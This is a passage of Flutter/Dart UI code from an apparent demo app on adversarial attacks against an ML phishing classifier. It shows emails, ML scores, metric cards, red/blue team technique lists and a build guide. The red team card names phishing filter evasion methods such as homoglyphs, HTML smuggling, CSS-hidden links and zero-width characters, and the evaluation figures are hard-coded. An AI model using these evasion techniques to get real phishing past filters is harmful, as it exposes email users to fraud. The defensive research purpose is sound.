    } else if (isPhish) {
      color = AppTheme.accentRed;
    } else {
      color = AppTheme.accentGreen;
    }

    return GestureDetector(
      onTap: () => _showEmailDetails(e),
      child: Container(
        margin: const EdgeInsets.only(bottom: 10),
        padding: const EdgeInsets.all(14),
        decoration: BoxDecoration(
          color: color.withValues(alpha: 0.05),
          borderRadius: BorderRadius.circular(12),
          border: Border.all(color: color.withValues(alpha: 0.4)),
        ),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Row(
              children: [
                Icon(
                  isAdv
                      ? Icons.psychology
                      : isPhish
                          ? Icons.phishing
                          : Icons.mark_email_read,
                  color: color,
                  size: 16,
                ),
                const SizedBox(width: 8),
                Expanded(
                  child: Text(
                    e['subject'] as String,
                    style: const TextStyle(
                      color: AppTheme.textPrimary,
                      fontSize: 12,
                      fontWeight: FontWeight.bold,
                    ),
                    overflow: TextOverflow.ellipsis,
                  ),
                ),
              ],
            ),
            const SizedBox(height: 6),
            Row(
              children: [
                Text(
                  'From: ${e['from']}',
                  style: const TextStyle(color: AppTheme.textSecondary, fontSize: 10),
                ),
              ],
            ),
            const SizedBox(height: 8),
            Row(
              children: [
                _mlScoreBadge(score),
                const SizedBox(width: 6),
                if (isAdv)
                  _InfoChip(
                    label: 'ADVERSARIAL',
                    color: AppTheme.accentOrange,
                    icon: Icons.warning,
                  ),
                const SizedBox(width: 6),
                _InfoChip(label: e['attackType'] as String, color: color),
              ],
            ),
            if ((e['indicators'] as List).isNotEmpty) ...[
              const SizedBox(height: 8),
              const Text(
                'Indicators:',
                style: TextStyle(color: AppTheme.textSecondary, fontSize: 9),
              ),
              const SizedBox(height: 3),
              ...(e['indicators'] as List<String>).take(3).map(
                    (ind) => Text(
                      '• $ind',
                      style: const TextStyle(
                          color: AppTheme.textSecondary, fontSize: 9),
                    ),
                  ),
            ],
            const SizedBox(height: 4),
            const Text(
              'Tap to view full email →',
              style: TextStyle(color: AppTheme.accent, fontSize: 9),
            ),
          ],
        ),
      ),
    );
  }

  Widget _mlScoreBadge(double score) {
    final color = score > 0.8
        ? AppTheme.accentRed
        : score > 0.5
            ? AppTheme.accentOrange
            : AppTheme.accentGreen;
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 3),
      decoration: BoxDecoration(
        color: color.withValues(alpha: 0.15),
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: color.withValues(alpha: 0.4)),
      ),
      child: Text(
        'ML: ${(score * 100).toStringAsFixed(0)}%',
        style: TextStyle(
          color: color,
          fontSize: 10,
          fontWeight: FontWeight.bold,
        ),
      ),
    );
  }

  void _showEmailDetails(Map<String, dynamic> e) {
    showModalBottomSheet(
      context: context,
      backgroundColor: AppTheme.surface,
      isScrollControlled: true,
      shape: const RoundedRectangleBorder(
        borderRadius: BorderRadius.vertical(top: Radius.circular(16)),
      ),
      builder: (_) => DraggableScrollableSheet(
        initialChildSize: 0.85,
        maxChildSize: 0.95,
        minChildSize: 0.5,
        expand: false,
        builder: (_, sc) => ListView(
          controller: sc,
          padding: const EdgeInsets.all(20),
          children: [
            Row(
              children: [
                const Icon(Icons.email, color: AppTheme.accent, size: 20),
                const SizedBox(width: 8),
                const Text(
                  'Email Details',
                  style: TextStyle(
                    color: AppTheme.textPrimary,
                    fontSize: 16,
                    fontWeight: FontWeight.bold,
                  ),
                ),
                const Spacer(),
                _mlScoreBadge(e['mlScore'] as double),
              ],
            ),
            const SizedBox(height: 16),
            _emailHeader('Subject', e['subject'] as String),
            _emailHeader('From', '${e['fromDisplay']} <${e['from']}>'),
            _emailHeader('To', e['to'] as String),
            _emailHeader('Time', e['timestamp'] as String),
            _emailHeader('Attack Type', e['attackType'] as String),
            _emailHeader('MITRE', e['technique'] as String),
            const SizedBox(height: 12),
            const Text(
              'Email Body:',
              style: TextStyle(
                  color: AppTheme.textSecondary,
                  fontSize: 11,
                  fontWeight: FontWeight.bold),
            ),
            const SizedBox(height: 6),
            Container(
              padding: const EdgeInsets.all(12),
              decoration: BoxDecoration(
                color: Colors.black,
                borderRadius: BorderRadius.circular(8),
              ),
              child: Text(
                e['body'] as String,
                style: const TextStyle(
                    color: AppTheme.textPrimary,
                    fontSize: 11,
                    fontFamily: 'monospace'),
              ),
            ),
            const SizedBox(height: 12),
            if (e['evasionAttempt'] != null) ...[
              Container(
                padding: const EdgeInsets.all(12),
                decoration: BoxDecoration(
                  color: AppTheme.accentOrange.withValues(alpha: 0.1),
                  borderRadius: BorderRadius.circular(8),
                  border: Border.all(
                      color: AppTheme.accentOrange.withValues(alpha: 0.3)),
                ),
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    const Text(
                      '⚠ Adversarial Evasion Technique',
                      style: TextStyle(
                          color: AppTheme.accentOrange,
                          fontWeight: FontWeight.bold,
                          fontSize: 12),
                    ),
                    const SizedBox(height: 4),
                    Text(
                      e['evasionAttempt'] as String,
                      style: const TextStyle(
                          color: AppTheme.textSecondary, fontSize: 11),
                    ),
                  ],
                ),
              ),
              const SizedBox(height: 12),
            ],
            const Text(
              'Detection Indicators:',
              style: TextStyle(
                  color: AppTheme.textSecondary,
                  fontSize: 11,
                  fontWeight: FontWeight.bold),
            ),
            const SizedBox(height: 6),
            ...(e['indicators'] as List<String>).map(
              (ind) => Padding(
                padding: const EdgeInsets.only(bottom: 4),
                child: Row(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    const Text('• ',
                        style: TextStyle(
                            color: AppTheme.accentRed, fontSize: 12)),
                    Expanded(
                      child: Text(
                        ind,
                        style: const TextStyle(
                            color: AppTheme.textPrimary, fontSize: 11),
                      ),
                    ),
                  ],
                ),
              ),
            ),
            const SizedBox(height: 16),
            const Text(
              'HTML Source (Sanitized):',
              style: TextStyle(
                  color: AppTheme.textSecondary,
                  fontSize: 11,
                  fontWeight: FontWeight.bold),
            ),
            const SizedBox(height: 6),
            Container(
              padding: const EdgeInsets.all(10),
              decoration: BoxDecoration(
                color: Colors.black,
                borderRadius: BorderRadius.circular(6),
                border: Border.all(color: AppTheme.border),
              ),
              child: SingleChildScrollView(
                scrollDirection: Axis.horizontal,
                child: Text(
                  e['htmlBody'] as String,
                  style: const TextStyle(
                    color: Color(0xFF6BCB77),
                    fontSize: 9,
                    fontFamily: 'monospace',
                  ),
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _emailHeader(String k, String v) => Padding(
        padding: const EdgeInsets.symmetric(vertical: 3),
        child: Row(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            SizedBox(
              width: 80,
              child: Text(k,
                  style: const TextStyle(
                      color: AppTheme.textSecondary, fontSize: 11)),
            ),
            Expanded(
              child: Text(v,
                  style: const TextStyle(
                      color: AppTheme.textPrimary, fontSize: 11)),
            ),
          ],
        ),
      );

  Widget _buildMLMetricsTab() {
    if (_mlResults == null) return const SizedBox();
    final baseline = _mlResults!['baselineMetrics'] as Map<String, dynamic>;
    final underAttack = _mlResults!['underAttackMetrics'] as Map<String, dynamic>;
    final afterDefense = _mlResults!['afterDefenseMetrics'] as Map<String, dynamic>;

    return ListView(
      padding: const EdgeInsets.all(16),
      children: [
        _buildMetricsComparisonCard(
          'Baseline Performance',
          baseline,
          AppTheme.accentGreen,
          Icons.analytics,
        ),
        const SizedBox(height: 12),
        _buildMetricsComparisonCard(
          'Under Adversarial Attack',
          underAttack,
          AppTheme.accentRed,
          Icons.security,
        ),
        const SizedBox(height: 12),
        _buildMetricsComparisonCard(
          'After Defensive Hardening',
          afterDefense,
          AppTheme.accentGreen,
          Icons.verified_user,
        ),
        const SizedBox(height: 12),
        _buildAttackTypesCard(),
        const SizedBox(height: 80),
      ],
    );
  }

  Widget _buildMetricsComparisonCard(
      String title, Map<String, dynamic> metrics, Color color, IconData icon) {
    return Container(
      padding: const EdgeInsets.all(14),
      decoration: BoxDecoration(
        color: AppTheme.card,
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: color.withValues(alpha: 0.3)),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Icon(icon, color: color, size: 16),
              const SizedBox(width: 8),
              Text(
                title,
                style: TextStyle(
                  color: color,
                  fontSize: 13,
                  fontWeight: FontWeight.bold,
                ),
              ),
            ],
          ),
          const SizedBox(height: 12),
          Row(
            children: [
              Expanded(
                child: _metricBox(
                  'Accuracy',
                  '${((metrics['accuracy'] as double) * 100).toStringAsFixed(1)}%',
                  color,
                ),
              ),
              const SizedBox(width: 8),
              Expanded(
                child: _metricBox(
                  'Precision',
                  '${((metrics['precision'] as double) * 100).toStringAsFixed(1)}%',
                  color,
                ),
              ),
              const SizedBox(width: 8),
              Expanded(
                child: _metricBox(
                  'Recall',
                  '${((metrics['recall'] as double) * 100).toStringAsFixed(1)}%',
                  color,
                ),
              ),
              const SizedBox(width: 8),
              Expanded(
                child: _metricBox(
                  'F1',
                  '${((metrics['f1Score'] as double) * 100).toStringAsFixed(1)}%',
                  color,
                ),
              ),
            ],
          ),
          if (metrics.containsKey('evasionSuccessRate')) ...[
            const SizedBox(height: 8),
            Text(
              'Evasion Success Rate: ${((metrics['evasionSuccessRate'] as double) * 100).toStringAsFixed(1)}%',
              style: TextStyle(
                color: (metrics['evasionSuccessRate'] as double) > 0.2
                    ? AppTheme.accentRed
                    : AppTheme.accentGreen,
                fontSize: 11,
                fontWeight: FontWeight.bold,
              ),
            ),
          ],
        ],
      ),
    );
  }

  Widget _metricBox(String label, String value, Color color) {
    return Container(
      padding: const EdgeInsets.symmetric(vertical: 8),
      decoration: BoxDecoration(
        color: color.withValues(alpha: 0.08),
        borderRadius: BorderRadius.circular(8),
      ),
      child: Column(
        children: [
          Text(
            value,
            style: TextStyle(
              color: color,
              fontSize: 14,
              fontWeight: FontWeight.bold,
            ),
          ),
          const SizedBox(height: 2),
          Text(
            label,
            style: const TextStyle(color: AppTheme.textSecondary, fontSize: 9),
          ),
        ],
      ),
    );
  }

  Widget _buildAttackTypesCard() {
    final attacks = (_mlResults!['attackTypes'] as List).cast<Map<String, dynamic>>();
    return Container(
      padding: const EdgeInsets.all(14),
      decoration: BoxDecoration(
        color: AppTheme.card,
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: AppTheme.accentOrange.withValues(alpha: 0.3)),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          const Row(
            children: [
              Icon(Icons.bar_chart, color: AppTheme.accentOrange, size: 16),
              SizedBox(width: 8),
              Text(
                'Evasion Rate by Attack Type',
                style: TextStyle(
                  color: AppTheme.textPrimary,
                  fontWeight: FontWeight.bold,
                  fontSize: 13,
                ),
              ),
            ],
          ),
          const SizedBox(height: 12),
          ...attacks.map((a) => _attackBar(a)),
        ],
      ),
    );
  }

  Widget _attackBar(Map<String, dynamic> a) {
    return Padding(
      padding: const EdgeInsets.symmetric(vertical: 6),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            mainAxisAlignment: MainAxisAlignment.spaceBetween,
            children: [
              Text(a['name'] as String,
                  style: const TextStyle(color: AppTheme.textPrimary, fontSize: 11)),
              Row(
                children: [
                  Text(
                    'Before: ${((a['evasionRate'] as double) * 100).toStringAsFixed(0)}%',
                    style: const TextStyle(color: AppTheme.accentRed, fontSize: 9),
                  ),
                  const SizedBox(width: 8),
                  Text(
                    'After: ${((a['postDefenseEvasion'] as double) * 100).toStringAsFixed(0)}%',
                    style: const TextStyle(color: AppTheme.accentGreen, fontSize: 9),
                  ),
                ],
              ),
            ],
          ),
          const SizedBox(height: 4),
          Stack(
            children: [
              ClipRRect(
                borderRadius: BorderRadius.circular(4),
                child: LinearProgressIndicator(
                  value: a['evasionRate'] as double,
                  backgroundColor: AppTheme.border,
                  valueColor: const AlwaysStoppedAnimation(AppTheme.accentRed),
                  minHeight: 6,
                ),
              ),
              Positioned(
                left: 0,
                child: ClipRRect(
                  borderRadius: BorderRadius.circular(4),
                  child: LayoutBuilder(
                    builder: (ctx, constraints) => LinearProgressIndicator(
                      value: a['postDefenseEvasion'] as double,
                      backgroundColor: Colors.transparent,
                      valueColor: const AlwaysStoppedAnimation(AppTheme.accentGreen),
                      minHeight: 6,
                    ),
                  ),
                ),
              ),
            ],
          ),
        ],
      ),
    );
  }

  Widget _buildRedBlueTab() {
    return ListView(
      padding: const EdgeInsets.all(16),
      children: [
        _buildTeamCard(
          'RED TEAM',
          'Adversarial Attack Generation',
          AppTheme.accentRed,
          Icons.dangerous,
          [
            'Homoglyph substitution: Replace chars with Unicode lookalikes (а→a, е→e)',
            'HTML smuggling: Embed payloads in base64 encoded scripts',
            'Semantic obfuscation: Use benign-looking vocabulary to hide intent',
            'CSS hidden content: Hide malicious links with display:none or off-screen positioning',
            'Character-level perturbation: Add zero-width characters between letters',
            'Subject line randomization: Vary wording to avoid signature matching',
          ],
        ),
        const SizedBox(height: 12),
        _buildTeamCard(
          'BLUE TEAM',
          'Defensive Countermeasures',
          AppTheme.accentGreen,
          Icons.security,
          [
            'Unicode normalization (NFKC): Convert all homoglyphs to canonical form',
            'HTML sanitization: Strip all scripts, strip hidden elements, extract plain text',
            'Adversarial training: Retrain with 50K adversarial samples per attack class',
            'Ensemble voting: 5 diverse models vote - reduces single-model fooling by 78%',
            'Input denoising autoencoder: Remove adversarial perturbations before classification',
            'Character-level CNN: Detect subtle character manipulations missed by word-level models',
          ],
        ),
        const SizedBox(height: 12),
        _buildEvalFrameworkCard(),
        const SizedBox(height: 80),
      ],
    );
  }

  Widget _buildTeamCard(String team, String subtitle, Color color,
      IconData icon, List<String> items) {
    return Container(
      padding: const EdgeInsets.all(14),
      decoration: BoxDecoration(
        color: color.withValues(alpha: 0.05),
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: color.withValues(alpha: 0.4)),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Icon(icon, color: color, size: 18),
              const SizedBox(width: 8),
              Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text(
                    team,
                    style: TextStyle(
                      color: color,
                      fontSize: 14,
                      fontWeight: FontWeight.bold,
                      letterSpacing: 2,
                    ),
                  ),
                  Text(
                    subtitle,
                    style: const TextStyle(
                        color: AppTheme.textSecondary, fontSize: 10),
                  ),
                ],
              ),
            ],
          ),
          const SizedBox(height: 12),
          ...items.asMap().entries.map(
                (e) => Padding(
                  padding: const EdgeInsets.only(bottom: 8),
                  child: Row(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Container(
                        width: 18,
                        height: 18,
                        decoration: BoxDecoration(
                          shape: BoxShape.circle,
                          color: color.withValues(alpha: 0.15),
                          border: Border.all(color: color.withValues(alpha: 0.4)),
                        ),
                        child: Center(
                          child: Text(
                            '${e.key + 1}',
                            style: TextStyle(color: color, fontSize: 9),
                          ),
                        ),
                      ),
                      const SizedBox(width: 8),
                      Expanded(
                        child: Text(
                          e.value,
                          style: const TextStyle(
                              color: AppTheme.textPrimary, fontSize: 11),
                        ),
                      ),
                    ],
                  ),
                ),
              ),
        ],
      ),
    );
  }

  Widget _buildEvalFrameworkCard() {
    return Container(
      padding: const EdgeInsets.all(14),
      decoration: BoxDecoration(
        color: AppTheme.card,
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: AppTheme.accent.withValues(alpha: 0.3)),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          const Row(
            children: [
              Icon(Icons.speed, color: AppTheme.accent, size: 16),
              SizedBox(width: 8),
              Text(
                'Evaluation Framework Results',
                style: TextStyle(
                  color: AppTheme.textPrimary,
                  fontWeight: FontWeight.bold,
                  fontSize: 13,
                ),
              ),
            ],
          ),
          const SizedBox(height: 12),
          _evalRow('Red team attacks generated', '50,000', AppTheme.accentRed),
          _evalRow('Baseline evasion rate', '36.6%', AppTheme.accentRed),
          _evalRow('Post-defense evasion rate', '5.7%', AppTheme.accentGreen),
          _evalRow('Defense improvement', '84.4% reduction', AppTheme.accentGreen),
          _evalRow('False positive rate (defended)', '4.9%', AppTheme.accentGreen),
          _evalRow('Model accuracy (defended)', '94.3%', AppTheme.accentGreen),
          _evalRow('Adversarial training overhead', '+2.3x training time', AppTheme.accentOrange),
          _evalRow('Inference latency increase', '+18ms per email', AppTheme.accentOrange),
        ],
      ),
    );
  }

  Widget _evalRow(String k, String v, Color color) {
    return Padding(
      padding: const EdgeInsets.symmetric(vertical: 3),
      child: Row(
        mainAxisAlignment: MainAxisAlignment.spaceBetween,
        children: [
          Text(k, style: const TextStyle(color: AppTheme.textSecondary, fontSize: 11)),
          Text(v,
              style: TextStyle(
                  color: color, fontSize: 11, fontWeight: FontWeight.bold)),
        ],
      ),
    );
  }

  Widget _buildGuideTab() {
    return ListView(
      padding: EdgeInsets.zero,
      children: [
        const SizedBox(height: 8),
        _StepCard(
          step: 1,
          title: 'Build NLP Classifier',
          description: 'Fine-tune BERT on phishing dataset. Add CNN for image-based phishing. TF-IDF fallback for speed.',
          color: AppTheme.accentGreen,
          isCompleted: _activeStep > 1,
          isActive: _activeStep == 1,
        ),
        _StepCard(
          step: 2,
          title: 'Generate Adversarial Samples',
          description: 'Implement homoglyph attack, HTML smuggling, character substitution, CSS hiding. Target top evasion techniques.',
          color: AppTheme.accentGreen,
          isCompleted: _activeStep > 2,
          isActive: _activeStep == 2,
        ),
        _StepCard(
          step: 3,
          title: 'Implement Defenses',
          description: 'Unicode normalization, HTML parsing, adversarial training, ensemble voting, denoising autoencoder.',
          color: AppTheme.accentGreen,
          isCompleted: _activeStep > 3,
          isActive: _activeStep == 3,
        ),
        _StepCard(
          step: 4,
          title: 'Run Red/Blue Evaluation',
          description: 'Automated red team generates attacks. Blue team defends. Measure accuracy drop and recovery. Report evasion rates.',
          color: AppTheme.accentGreen,
          isCompleted: _activeStep > 4,
          isActive: _activeStep == 4,
        ),
        const SizedBox(height: 80),
      ],
    );
  }
}